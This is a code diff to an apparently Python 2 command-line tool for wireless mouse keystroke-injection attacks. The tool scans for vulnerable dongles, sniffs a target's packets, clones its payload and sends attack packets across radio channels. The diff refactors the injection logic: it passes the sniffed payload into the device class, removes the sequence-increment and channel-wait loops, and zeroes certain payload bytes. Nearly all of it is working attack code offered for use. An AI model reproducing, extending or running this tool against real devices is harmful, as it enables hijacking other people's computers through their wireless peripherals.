@@ -188,15 +188,15 @@ class mouse:
     # ...etc. There are more on http://www.freebsddiary.org/APC/usb_hid_usages.php
   }
 
-  def __init__(self, radio, address, ack_timeout=250, retries=3):
+  def __init__(self, radio, address, payload, ack_timeout=250, retries=3):
     self.radio = radio
     self.address = address
     self.string_address = ':'.join('{:02X}'.format(b) for b in address)
     self.raw_address = self.string_address.replace(':', '').decode('hex')[::-1][:5]
-    self.payload = [0] * 19
     self.channels = range(2, 84)
     self.pingable = True
     self.encrypted = True
+    self.update(payload)
 
     # Format the ACK timeout and auto retry values
     self.ack_timeout = int(ack_timeout / 250) - 1
@@ -266,9 +266,6 @@ class mouse:
     self.radio.transmit_payload(self.serialize(self.payload), self.ack_timeout, self.retries)
 
   def send_attack(self, attack):
-    for _ in range(100):
-      self.inc_sequence()
-    
     for _ in range(3):
       self.transmit()
       time.sleep(0.005)
@@ -297,6 +294,7 @@ class mouse:
     if len(payload) == 19 and payload[1] == 0x90:
       if (payload[0] == 0x08 or payload[0] == 0x0c) and payload[6] == 0x40:
         self.payload = payload.tolist()
+        self.payload[4:6] = [0, 0]
         self.payload[7:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
         self.channels = [21, 23, 25, 46, 50, 56, 60, 72, 74, 78]
         self.pingable = False
@@ -305,6 +303,7 @@ class mouse:
         p = self.decrypt(payload)
         if p[6] == 0x40:
           self.payload = p.tolist()
+          self.payload[4:6] = [0, 0]
           self.payload[7:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
           self.channels = range(2, 84)
           self.pingable = True
@@ -355,11 +354,6 @@ def cli(debug, lowpower, interval):
 
   # Create scanner instance
   scan = scanner(radio=radio, debug=debug)
-
-  # Channel timeout in seconds
-  timeout = 0.1
-  sniff_timeout = 5.0
-  channel_timeout = 0.1
 
   print G + "[+] " + W + 'Scanning...'
 
@@ -424,39 +418,12 @@ def cli(debug, lowpower, interval):
         print R + '[-] ' + W + "Target %s is not injectable or not a mouse. Skipping..." % (scan.hexify(address))
         continue
 
-      last_ping = time.time()
-      last_packet = time.time()
       scan.sniff(address)
-      device = mouse(radio, address)
-      device.update(payload)
-
-      print GR + '[+] ' + W + "Waiting until channel is clear..."
-      while time.time() - last_packet > sniff_timeout:
-        # Follow the target device if it changes channels
-        if time.time() - last_ping > channel_timeout and device.pingable:
-          if scan.follow():
-            last_ping = time.time()
-
-        # Receive payload
-        value = radio.receive_payload()
-        if value[0] == 0:
-          # Reset the follow timer
-          last_ping = time.time()
-
-          if len(payload) == 19 and p[1] == 0x90:
-            
-            # Reset the packet timer
-            last_packet = time.time()
-
-            # Split the payload from the status byte
-            payload = value[1:]
-
-            # Update the payload
-            device.update(payload)
+      device = mouse(radio, address, payload)
       
       for channel in channels:
         radio.set_channel(channel)
-        print GR + '[+] ' + W + 'Sending attack on channel %d' % (channel)
+        print GR + '[+] ' + W + 'Sending attack to %s on channel %d' % (scan.hexify(address), channel)
         device.send_attack(attack)
 
     print GR + '\n[+] ' + W + "All attacks completed\n"
